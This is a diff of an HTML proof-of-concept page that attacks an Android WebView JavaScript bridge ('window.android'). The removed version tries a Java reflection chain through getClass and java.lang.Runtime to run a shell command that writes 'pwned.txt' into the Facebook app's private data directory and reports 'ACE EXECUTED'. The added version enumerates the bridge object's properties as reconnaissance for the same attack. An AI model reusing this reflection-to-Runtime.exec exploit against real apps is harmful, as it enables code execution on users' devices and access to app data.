@@ -1,56 +1,41 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>JSI Reflection ACE</title>
-</head>
-<body style="background:#000; color:#0f0; font-family:monospace; font-size: 12px;">
-    <h3>Attempting Bridge Reflection...</h3>
-    <div id="log">Analyzing android.webview()...</div>
+<body style="background:#000; color:#0f0; font-family:monospace;">
+    <h3>Probing android.webview Property...</h3>
+    <div id="log">Checking types...</div>
 
     <script>
         const logEl = document.getElementById('log');
         function log(msg) { logEl.innerHTML += "<br>" + msg; }
 
-        function climbTree() {
-            try {
-                if (!window.android || !window.android.webview) {
-                    log("[!] Target method not found.");
-                    return;
-                }
+        function probe() {
+            if (!window.android) {
+                log("[!] android object missing");
+                return;
+            }
 
-                // 1. Grab the result of the bridge call
-                let bridgeResult = window.android.webview();
-                log("[*] Result type: " + typeof bridgeResult);
-                log("[*] Result string: " + bridgeResult);
+            let wv = window.android.webview;
+            log("[*] Type of android.webview: " + typeof wv);
 
-                // 2. Attempt Reflection
-                // We try to see if we can access the Java Class of the returned object
-                if (bridgeResult && bridgeResult.getClass) {
-                    log("<span style='color:red;'>[!!!] REFLECTION DETECTED!</span>");
-                    let javaClass = bridgeResult.getClass();
-                    log("[*] Java Class: " + javaClass.getName());
-
-                    // 3. The ACE Pivot
-                    // We hunt for the Runtime object to execute shell commands
-                    let runtime = javaClass.forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null);
-                    log("[*] Runtime acquired. Attempting execution...");
-                    
-                    // This command would prove ACE by creating a file in the app's private data
-                    runtime.exec("touch /data/data/com.facebook.katana/pwned.txt");
-                    log("<span style='color:red;'>[SUCCESS] ACE EXECUTED!</span>");
-                } else {
-                    log("[?] No direct getClass access. Fuzzing properties...");
-                    for (let prop in bridgeResult) {
-                        log(` -> .${prop}`);
+            if (typeof wv === 'object' && wv !== null) {
+                log("<span style='color:red;'>[!!!] DATA OBJECT DETECTED</span>");
+                for (let prop in wv) {
+                    try {
+                        log(` -> .${prop} (Type: ${typeof wv[prop]})`);
+                    } catch(e) {
+                        log(` -> .${prop} (ACCESS DENIED)`);
                     }
                 }
-            } catch (e) {
-                log("<span style='color:orange;'>[!] Error: " + e + "</span>");
+            } else {
+                log("[*] Attempting to access as getter...");
+                try {
+                    log("[*] Value: " + wv);
+                } catch(e) {
+                    log("[!] Error reading property: " + e);
+                }
             }
         }
-
-        setTimeout(climbTree, 1500);
+        setTimeout(probe, 1000);
     </script>
 </body>
 </html>
